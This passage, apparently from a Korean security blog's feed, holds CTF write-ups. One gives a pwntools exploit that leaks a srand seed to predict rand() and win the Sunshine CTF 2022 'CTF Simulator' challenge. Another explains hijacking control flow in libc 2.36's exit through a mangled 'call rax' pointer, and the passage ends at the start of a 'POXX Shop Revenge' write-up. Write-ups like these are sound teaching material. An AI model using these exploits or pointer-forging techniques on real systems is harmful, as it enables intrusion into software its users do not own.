0xc7, 0xf7, 0x96, 0x83, 0x4, 0x8, 0x60, 0xf1, 0xc1, 0xf7, 0x90, 0x38, 0xc7, 0xf7, 0xc0, 0x70, 0xc3, 0xf7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>buf = [<span class="number">0x30</span>, <span class="number">0xf</span>, <span class="number">0xc5</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x9c</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0x96</span>, <span class="number">0x83</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x60</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xf7</span>, <span class="number">0x90</span>, <span class="number">0x38</span>, <span class="number">0xc7</span>, <span class="number">0xf7</span>, <span class="number">0xc0</span>, <span class="number">0x70</span>, <span class="number">0xc3</span>, <span class="number">0xf7</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bytes</span>(buf)</span><br><span class="line"><span class="string">b&#x27;0\x0f\xc5\xf7\xd0\x9c\xc7\xf7\x96\x83\x04\x08`\xf1\xc1\xf7\x908\xc7\xf7\xc0p\xc3\xf7&#x27;</span></span><br></pre></td></tr></table></figure><p>하지만 내가 함수 주소 leak하는 코드를 <code>printf</code> 함수를 이용했기 때문에 null byte까지 출력하는 <code>printf</code> 함수 특성에 의해 4바이트 이상이 출력이 된다. </p><p><code>atoi@got</code> 같은 경우에는 바로 뒤가 null byte였기 때문에 4바이트가 깔끔하게 출력된 것이었다. </p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> printf </tag>
            
            <tag> GOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sunshine CTF 2022 - CTF Simulator (srand)</title>
      <link href="/221127-sunshine2022-ctf_simulator/"/>
      <url>/221127-sunshine2022-ctf_simulator/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(74&#x2F;445) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Step right up and compete to improve your guessing CTF skills!</p><p>nc sunshinectf.games 22000</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── ctf-simulator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-simulator: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8095b13ea4b618e9e704441f0d78b2e9989b5d14, for GNU/Linux 3.2.0, stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>전부 다 걸려있다고 겁먹으면 안된다. 오히려 간단한 문제일 수도 있다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+18h] [rbp-88h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [rsp+28h] [rbp-78h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> || read(fd, &amp;dest[<span class="number">0x14</span>], <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Fatal error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  srand(*(_DWORD *)&amp;dest[<span class="number">0x14</span>]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;||| CTF Simulator 2022 |||&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This CTF training simulator will hone your guessing skills so you can be more competitive in CTF competitions!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s the name of your CTF team?\n[&gt;] &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  src = sub_1349();</span><br><span class="line">  <span class="keyword">if</span> ( !src )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid team name!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, src, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &lt;= <span class="number">999999999</span>; i *= <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Okay %s, I&#x27;m thinking of a number between 1 and %d. What is it?\n[&gt;] &quot;</span>, dest, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    src = sub_1349();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(src, <span class="string">&quot;%d&quot;</span>, &amp;v4) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad guess!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too low!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Too high!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s it!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, did you hack into my brain? Great guessing! You&#x27;ll be a CTF star in no time!&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Flag file is missing!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">100</span>, stream) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error reading from flag file!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  v10 = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    *v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s a reward for you: %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>요약하자면 <code>for ( i = 10; i &lt;= 999999999; i *= 10 )</code> 동안 랜덤한 수를 맞춰야 한다. </p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>CTF team name을 입력할 때 srand 인자 leak이 가능하다.<br><code>&amp;dest[0x14]</code>에 4바이트로 srand의 인자로 <code>/dev/urandom</code>의 랜덤한 값을 입력한다. 후에 CTF team name을 사용자에게 src에 입력받고 <code>strncpy(dest, src, 0x14uLL);</code> 에서 dest에 복사한다. printf는 공백까지 출력하기 때문에 CTF team name에 0x14를 꽉꽉 채워서 입력해주면 <code>&amp;dest[0x14]</code>도 출력할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x55f716d94430: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x55f716d94440: 0xd9fd281441414141      0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ol><li>srand 인자 leak하는 python 코드 작성</li><li>해당 인자를 가지고 random 수를 출력하는 c 프로그램 작성</li><li>인자를 c 프로그램에 넘겨주어 random 수를 출력하는 것을 받아오는 python 코드 작성</li><li>문제 프로그램에 넘기기</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>&#96;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;sunshinectf.games&quot;</span>, <span class="number">22000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;CTF team?\n&#x27;</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seed = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">info(<span class="built_in">str</span>(seed))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">argv1 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">argv1[<span class="number">1</span>] = <span class="built_in">str</span>(seed)</span><br><span class="line"></span><br><span class="line">pp = process(executable=<span class="string">&#x27;./a.out&#x27;</span>, argv=argv1)</span><br><span class="line"></span><br><span class="line">v7 = [<span class="string">&quot;&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v7[i] = pp.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">pp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;[&gt;]&#x27;</span>, v7[i])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc random.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*printf(&quot;%s\n&quot;, argv[1]);*/</span></span><br><span class="line">    <span class="comment">/*printf(&quot;%d\n&quot;, atoi(argv[1]));*/</span></span><br><span class="line">    </span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">10</span>; i &lt; <span class="number">999999999</span>; i *= <span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> v7 = rand() % i + <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, v7);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="struct-unpack"><a href="#struct-unpack" class="headerlink" title="struct.unpack"></a>struct.unpack</h4><p><code>struct.unpack</code>의 첫번째 인자로 I를 주면 byte를 unsigned int로 바꾸어주는 것을 알게 되었다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;i&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(-850492289,)</span><br><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;I&#x27;, b&#x27;\x7f\x84\x4e\xcd&#x27;)</span><br><span class="line">(3444475007,)</span><br></pre></td></tr></table></figure><p><code>struct.unpack</code>만 보면 어색했는데 이제 조금 익숙해졌다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun&#123;gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Sunshine </category>
          
      </categories>
      
      
        <tags>
            
            <tag> random </tag>
            
            <tag> srand </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How to RIP control in libc 2.36</title>
      <link href="/221122-how_to_rip_control_in_libc236/"/>
      <url>/221122-how_to_rip_control_in_libc236/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>위 문제를 libc 2.36의 <code>exit</code> 함수의 <code>call rax</code> 가젯을 이용하여 익스플로잇하는 과정이다.</p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>때는 바야흐로 약 한 달 전.. POXX 2022 본선 문제 출제를 하던 중이었다. 해당 문제는 fsb와 aaw가 가능하지만 FULL RELRO가 걸려있어 GOT overwriting은 불가능 해서 일반적으로 <code>malloc_hook</code>이나 <code>free_hook</code>을 덮어서 익스해야 한다. 하지만 해당 문제에서의 libc 버전이 최신 버전(2.36) 이기 때문에 위와 같은 방법은 익스가 불가능하다. 왜냐하면 둘 다 사용을 안하는 것으로 패치되었기 때문이다. 해당 과정을 분석하게 된 계기는, printf에서의 malloc 호출과 exit에서의 free 호출을 살펴보면서 분석하게 되었다. </p><p><code>malloc_hook</code>과 <code>free_hook</code>을 사용하지 않는 익스 방법이 있을까 분석을 진행하다가 <code>exit</code> 함수에서 <code>call rax</code> 라는 쓸만한 가젯을 보았고 해당 부분 트리거를 진행해보았다. 물론 여러가지의 시행착오가 있었지만 한 달 전의 일이라 기억이 가물하기도 해서 트리거에 성공한 과정만 간략하게 블로그에 작성해보겠다.</p><h2 id="How-to-RIP-control-in-libc-2-36"><a href="#How-to-RIP-control-in-libc-2-36" class="headerlink" title="How to RIP control in libc 2.36"></a>How to RIP control in libc 2.36</h2><p><img src="/images/221122-how_to_rip_control_in_libc236/221122-1.png" alt="img1">  </p><p>주목할 가젯은 <code>loc_3AF9E</code>의 <code>call rax</code>이고 <code>rax</code>에 집중 및 동적 분석을 통해 최종적으로 분석할 블록은 <code>loc_3AF70</code>이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000003AF70</span><br><span class="line">.text:000000000003AF70 loc_3AF70:</span><br><span class="line">.text:000000000003AF70 add     rdx, r15</span><br><span class="line">.text:000000000003AF73 mov     rax, [rdx+18h]</span><br><span class="line">.text:000000000003AF77 mov     r13, [rdx+20h]</span><br><span class="line">.text:000000000003AF7B mov     qword ptr [rdx+10h], 0</span><br><span class="line">.text:000000000003AF83 mov     edx, ebx</span><br><span class="line">.text:000000000003AF85 ror     rax, 11h</span><br><span class="line">.text:000000000003AF89 xor     rax, fs:30h</span><br><span class="line">.text:000000000003AF92 xchg    edx, [r14]</span><br><span class="line">.text:000000000003AF95 cmp     edx, 1</span><br><span class="line">.text:000000000003AF98 jg      loc_3B0B0</span><br></pre></td></tr></table></figure><p>$rax 값을 [rdx+18h]에서 가져와서, ROR 연산을 시도한다. 그 후 XOR 연산도 진행한다. 이러한 두 번의 연산을 거쳐서 결국 <code>call rax</code>를 한다. 우리는 임의 주소 쓰기가 가능하기 때문에 rax를 조작할 수 있는 상황이다. 더 나아가서 생각해보면 [rdx+18h]을 직접 조작할 수 있고, 해당 값은 우리가 호출하고 싶은 주소가 signing 된 값임을 알 수 있다.</p><p>역연산을 통해 signing 된 값이 무엇인지 수식으로 작성해보면 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROL = <span class="keyword">lambda</span> val, r_bits, max_bits: \</span><br><span class="line">    (val &lt;&lt; r_bits%max_bits) &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>) | \</span><br><span class="line">    ((val &amp; (<span class="number">2</span>**max_bits-<span class="number">1</span>)) &gt;&gt; (max_bits-(r_bits%max_bits)))</span><br><span class="line"></span><br><span class="line">sign = ROL(e.sym[<span class="string">&#x27;gift&#x27;</span>] ^ key, <span class="number">0x11</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>signing 된 값을 구하기 위해 key를 알아야 한다. 0x3AF89에 break point를 걸고 rax 레지스터를 0으로 세팅하면 아래의 식에 의해 <code>fs:30h</code> 값을 구할 수 있다. 이 값이 key이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 ^ A = A</span><br></pre></td></tr></table></figure><p>그렇게 구한 <code>fs:30h</code>을 메모리 상에서 검색해보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x7801dafd8bba0173</span><br><span class="line">[+] Searching &#x27;\x73\x01\xba\x8b\xfd\xda\x01\x78&#x27; in memory</span><br><span class="line">[+] In (0x7fedbeb04000-0x7fedbeb07000), permission=rw-</span><br><span class="line">  0x7fedbeb04770 - 0x7fedbeb04790  →   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;/usr/lib/ld-linux-x86-64.so.2&#x27;(0x7fedbed37000-0x7fedbed39000), permission=r--</span><br><span class="line">  0x7fedbed38a70 - 0x7fedbed38a90  →   &quot;\x73\x01\xba\x8b\xfd\xda\x01\x78[...]&quot;</span><br><span class="line">[+] In &#x27;[stack]&#x27;(0x7fff23bf6000-0x7fff23c17000), permissdfsd</span><br><span class="line"></span><br><span class="line">\xfd\xda\x01\x78[...]&quot;</span><br></pre></td></tr></table></figure><p>stack에 이미 해당 값이 존재하고 있었고, 해당 문제에서 fsb 터지는 주소가 더 높은 곳에 위치했기 때문에 <code>fs:30h</code>을 leak할 수 있다.</p><p>다만 key 값이 한 바이트 밀려 있어서(?) 조금의 전처리 과정이 필요하다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fff23c14cf0: 0x01dafd8bba0173f5      0x0034365f36387878</span><br></pre></td></tr></table></figure><p>leak1 &#x3D; 0x01dafd8bba0173f5<br>leak2 &#x3D; 0x0034365f36387878</p><p>leak1에서 맨 마지막 바이트를 자르고 leak2에서 맨 마지막 바이트를 가져와 맨 앞에 붙여줘야 한다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leak1 &gt;&gt; 8 = 0x1dafd8bba0173</span><br><span class="line">leak2 &amp; 0xff = 0x78</span><br></pre></td></tr></table></figure><p>최종적으로 아래와 같은 수식을 통해 key 값을 구할 수 있다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = (leak1 &gt;&gt; 8) + ((leak2 &amp; 0xff) &lt;&lt; 8*7)</span><br><span class="line">key = 0x7801dafd8bba0173</span><br></pre></td></tr></table></figure><p>결론적으로 우리는 key를 구했으므로 gift 함수가 signing 된 값을 구하고 스택에 값을 쓸 수 있다. 이 값은 exit 함수의 로직 중 인증이 되어 최종적으로 call 할 수 있다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(auther) Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
      <link href="/221121-poxx2022-shop_revenge/"/>
      <url>/221121-poxx2022-shop_revenge/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(0&#x2F;10) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>저번에는 이거 shell로 바꿔주셨잖아요..</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><p>Dockerfile에서 libc를 추출해서 patch한 다음에 문제를 풀어야 한다. 참고로 최신 libc이다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>No canary found라고 나오지만 canary가 존재한다.</p><p>FULL RELRO라서 GOT overwriting이 불가능하다. 그래서 보통 <code>malloc_hook</code>, <code>free_hook</code>, <code>_rtld_global._dl_rtld_lock_recursive</code> 등을 덮어 실행 흐름을 조작할 수 있다. 하지만 문제에서 최신 libc를 사용하기 때문에 <code>malloc_hook</code>과 <code>free_hook</code> 등을 덮는 것은 불가능하고 덮을 다른 곳을 찾아봐야 한다.</p><h3 id="Souece-Code"><a href="#Souece-Code" class="headerlink" title="Souece Code"></a>Souece Code</h3><p>ida 전체 코드이다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 